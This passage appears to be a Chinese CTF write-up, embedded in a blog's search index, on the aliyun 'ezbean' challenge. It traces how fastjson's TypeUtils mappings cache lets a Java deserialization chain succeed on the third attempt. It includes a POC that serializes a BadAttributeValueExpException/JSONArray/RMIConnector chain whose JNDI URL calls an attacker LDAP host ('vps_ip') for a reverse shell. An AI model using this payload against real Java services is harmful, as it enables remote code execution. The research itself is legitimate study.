<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[aliyun CTF] ezbean分析与思考</title>
    <link href="/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/"/>
    <url>/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="aliyun-CTF-ezbean分析与思考"><a href="#aliyun-CTF-ezbean分析与思考" class="headerlink" title="aliyun CTF ezbean分析与思考"></a>aliyun CTF ezbean分析与思考</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文的重点，具体可以参考</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson和原生反序列化</a></p><h2 id="0x01-题目背景"><a href="#0x01-题目背景" class="headerlink" title="0x01 题目背景"></a>0x01 题目背景</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>题目给出了一个可以反序列化参数data传入数据的路由read</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png" alt="image-20230504230327231"></p><blockquote><p>这里的<code>MyObjectInputStream</code>继承自<code>ObjectInputStream</code>,调用readObject方会先进入resolveClass具体调用栈如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236187.png" alt="image-20230504233800680"></p></blockquote><p>跟进resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>   <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<span class="hljs-comment">//*</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>方法，是一个黑名单过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><span class="hljs-comment">//...  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><blockquote><p>不过经实测这个黑名单似乎起不到过滤的作用</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236143.png" alt="image-20230504234209559"></p></blockquote><h2 id="0x02-问题发现"><a href="#0x02-问题发现" class="headerlink" title="0x02 问题发现"></a>0x02 问题发现</h2><h3 id="限制分析"><a href="#限制分析" class="headerlink" title="限制分析"></a>限制分析</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p><p><code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p>这里提一下fastjson中的反序列化机制，由于ObjectInputStream的不安全性，fastjson在调用<code>JSONArray/JSONObject</code>的readObject方法触发反序列化时，会将反序列化过程委托给<code>SecureObjectInputStream</code>处理，这个类可以理解成是安全的<code>ObjectInputStream</code>，下图为委托起点(<code>ObjectInputStream#defaultReadObject</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236065.png" alt="image-20230504235432194"></p><p>之后的过程感兴趣可以调一下看下调用栈，几个节点如下（太多了，只选了其中几个）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream #defaultReadObject<br>ObjectInputStream #ReadObject<br>ObjectInputStream #ReadObject0<br>ObjectInputStream #readNonProxyDesc<br>SecureObjectInputStream #resolveClass<br></code></pre></td></tr></table></figure><p>关注一下resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>    <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> name.lastIndexOf(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>            name = name.substring(index + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span> &amp;&amp; name.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;;&#x27;</span>) &#123;<br>            name = name.substring(<span class="hljs-number">1</span>, name.length() - <span class="hljs-number">1</span>);<br>        &#125;<br>        ParserConfig.global.checkAutoType(name, <span class="hljs-literal">null</span>, Feature.SupportAutoType.mask);<span class="hljs-comment">//重点，调用了checkAutoType方法</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>反序列化失败的大多数原因都是checkAutoType函数执行过程中抛出了JSONException异常</p></blockquote><p>这个异常大概字符串是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">default</span> constructor not found. <span class="hljs-keyword">class</span> <span class="hljs-title class_">xxxxx</span><br></code></pre></td></tr></table></figure><p>这样的话之前的链子就打不通了，原来有Fastjson反序列化的链子思路是从<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>，进而最后能触发任意类的getter(就是类的方法名以get开头的)，回看这题给的MyBean，里面有个<code>getConnect</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConnect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-built_in">this</span>.conn.connect();<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">//   private JMXConnector conn;</span><br></code></pre></td></tr></table></figure><blockquote><p>只要我们能触发getConnect，将conn设置为RMIConnector，可以触发JNDI注入，之后也就能反弹shell了</p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jmxurl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;<br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(jmxurl);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>com.ctf.ezser.bean.<span class="hljs-type">MyBean</span> <span class="hljs-variable">mb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="hljs-string">&quot;sssaaaa&quot;</span>,rmi);<br><br>com.alibaba.fastjson.<span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONArray();<br>jsonArray.add(mb);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal">true</span>);<br>valfield.set(val, jsonArray);<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(val);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>System.out.println(ret);<br></code></pre></td></tr></table></figure><h3 id="玄学事件"><a href="#玄学事件" class="headerlink" title="玄学事件"></a>玄学事件</h3><p>按理来说，根据上述链子构造的反序列化应该会被SecureObjectInputStream拦截，进而执行<code>checkAutoType</code>然后抛出JSONException异常，导致反序列化失败，但神奇的是前两次反序列化一定失败，而从第三次开始就能成功并反弹shell。并且官方wp也用的这条链子，但写得过于简短，看冠军队的wp说是fj的随机构造函数问题，后来调了一下感觉可能不是这个原因</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237675.png" alt="image-20230505012846237"></p><p>一开始以为三次只是巧合，后来每次验证都是三次。并且第一次是<code>default constructor not found. class xxx.RMIConnector</code>第二次是<code>default constructor not found. class xxx.JMXServiceURL</code></p><p>这里先提一下checkAutoType通过typeName找类的三种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//🌟</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>经过测试，最主要的方法是<code>TypeUtils.getClassFromMapping</code>这个方法会去TypeUtils的mappings成员里找是否有以typeName为Name的类（🌟🌟这个很重要 记一下）mappings是静态私有成员，在初始化时就放入了107个常见类（也是SecureObjectInputStream认为是安全的类）</p></blockquote><p>调的过程中发现三次执行的过程中，这个mappings成员的size分别是108、109、110，而在110时反序列化成功，想必大家看到这里都能发现这个关键点了，也能猜测到前两次工作是把抛出异常没找到那个类添加进mappings</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>理论上是说得通了，还得是调试一下来验证</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这题里能传入checkAutoType去寻找的非原生类只有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.ctf.ezser.bean.MyBean <span class="hljs-comment">//反序列化终点，被调用getConnect-》this.conn.connect();</span><br>javax.management.remote.rmi.RMIConnector <span class="hljs-comment">//传入MyBean构造函数给conn赋值</span><br>javax.management.remote.JMXServiceURL  <span class="hljs-comment">//用于传入RMIConnector构造函数</span><br></code></pre></td></tr></table></figure><h3 id="异常信号寻找"><a href="#异常信号寻找" class="headerlink" title="异常信号寻找"></a>异常信号寻找</h3><p>首先先找一下这个一直报错的<code>default constructor not found. class xxx</code>字段，找出来是在<code>JavaBeanInfo#build</code>方法的某处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> ((!kotlin)<br>            &amp;&amp; !clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="hljs-literal">null</span>, creatorConstructor, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, jsonType, fieldList);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;default constructor not found. &quot;</span> + clazz);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在这题的反序列化过程中kotlin都为false，因此关注第二个条件，经调试，走到这一步的clazz都不会是<code>javax.servlet.http.Cookie</code>，而是上面三个前提条件中的后两个</p></blockquote><p>checkAutoType方法后续会创建一个JavaBeanInfo调用clazz方法，不过前提是前一个if没有成功的return跳出函数，从下面代码可以看出，如果三种方法都找不到class，也就不会提前退出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-comment">//...🌟🌟</span><br>  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>      <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>  &#125;<span class="hljs-comment">//***处</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);<br>    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>若没有提前退出会来到上面标识的<code>***</code>处，这里有一个很重要的操作，把还没找到的类的类名typeName添加进TypeUtils的mappings中，使用类加载器加载该类并赋值给clazz，这里可以简单看一下TypeUtils.loadClass关键部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(classLoader != <span class="hljs-literal">null</span>)&#123;<br> clazz = classLoader.loadClass(className);<br> <span class="hljs-keyword">if</span> (cache) &#123;<br>     mappings.put(className, clazz);<br> &#125;<br> <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下传入<code>ParserConifg#checkAutoType</code>的类名会经历以下过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>简单的类名检查，若处于黑名单则抛出异常 autoType is not support xxx<br><span class="hljs-number">2.</span>使用三种方法通过类名来加载类：<br>        TypeUtils.getClassFormMappings (基本都通过这个方法找到)<br>        IdentityHashMap.findClass<br>        ConcurrentHashMap.get<br><span class="hljs-number">3.</span>若找到，会进入以下<span class="hljs-keyword">if</span>进而<span class="hljs-keyword">return</span>找到的类提前退出checkAutoType函数<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-number">4.</span>继续执行，通过TypeUtils的loadClass方法利用类加载器找到类，并将当前类加入TypeUtils的mappings中<br><span class="hljs-number">5.</span>调用JavaBeanInfo的build方法，传入当前类，当类没有无参构造函数时会抛出异常 <span class="hljs-keyword">default</span> constructor not found. xxxx<br></code></pre></td></tr></table></figure><h3 id="第一次反序列化"><a href="#第一次反序列化" class="headerlink" title="第一次反序列化"></a>第一次反序列化</h3><p>首先是入口点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">objectInputStream.readObject();<br></code></pre></td></tr></table></figure><p>接着来到JSONArray#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      JSONObject.SecureObjectInputStream.ensureFields();<br>      <span class="hljs-keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="hljs-literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;<br>          <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">secIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>.SecureObjectInputStream(in);<br>          <span class="hljs-keyword">try</span> &#123;<br>              secIn.defaultReadObject();<br>              <span class="hljs-keyword">return</span>;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.NotActiveException e) &#123;<br>              <span class="hljs-comment">// skip</span><br>          &#125;<br>      &#125;<br>  <span class="hljs-comment">//。。。</span><br></code></pre></td></tr></table></figure><p>之后就被<code>SecureObjectInputStream</code>劫持了</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237433.png" alt="image-20230505020221637"></p><p>直接来到最关键的checkAutoType方法，可以看到先找的是MyBean</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237274.png" alt="image-20230505020313917"></p><p>跟进checkAutoType方法，前面部分跳过，直接来个经典三个方法寻找类</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237845.png" alt="image-20230505020425672"></p><p>这里可以先跟进一下getClassFromMapping方法，可以看到此时的Mappings（size：107）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237915.png" alt="image-20230505020521779"></p><p>经过三个方法，仍然没有找到类，这也就意味着接下来一定会去到JavaBeanInfo的build方法中(异常抛出点)，不过在这之前会先通过Typeutils的loadClass方法找到类，并添加mappings的数量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>&#125;<br></code></pre></td></tr></table></figure><p>MyBean被添加，size变为108</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238540.png" alt="image-20230505020903956"></p><p>之后就来到了这个死亡异常抛出点JavaBeanInfo的build方法，但你会惊奇的发现，并没有抛出异常，程序继续走到了下一个类RMIConnector传入checkAutoType方法，其实是因为这个if的条件不满足，build函数提前返回</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238797.png" alt="image-20230505021125948"></p><blockquote><p>这也很好理解，那个异常提示的很明显了<code>default constructor not found. class xxx</code>而MyBean明显是有无参构造方法的，这里的defaultConstructor就是获取到了无参构造方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238509.png" alt="image-20230505015849391"></p></blockquote><p>没有异常抛出，无事发生，接着轮到RMIConnector</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050247946.png" alt="image-20230505021320328"></p><p>后面都是一样的操作，三个方法都找不到类，被添加进mappings，size+1</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238031.png" alt="image-20230505021419699"></p><p>然后来到死亡异常抛出点JavaBeanInfo的build方法，没有无参构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238335.png" alt="image-20230505021538934"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239359.png" alt="image-20230505021549225"></p><p>迎来第一次报错</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239280.png" alt="image-20230505021625294"></p><h3 id="第二次反序列化"><a href="#第二次反序列化" class="headerlink" title="第二次反序列化"></a>第二次反序列化</h3><p>接着进行第二次，发送payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239992.png" alt="image-20230505021702771"></p><p>MyBean和RMIConnector的checkAutoType就先跳过，这两类以及被加入mappings了，是可以通过三个方法后的这部分代码提前退出的,就不再跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接开始分析JMXServiceURL，三个方法找不到类，调用laodClass</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239172.png" alt="image-20230505021939903"></p><p>加入mappings， size+1，至此，可以支持反序列化成功的mappigns已经装填好</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239392.png" alt="image-20230505022008745"></p><p>之后又因为没有无参构造方法抛出异常</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239543.png" alt="image-20230505022107758"></p><p>迎来第二个报错</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239596.png" alt="image-20230505022142322"></p><h3 id="第三次反序列化（也是反序列化成功的开始）"><a 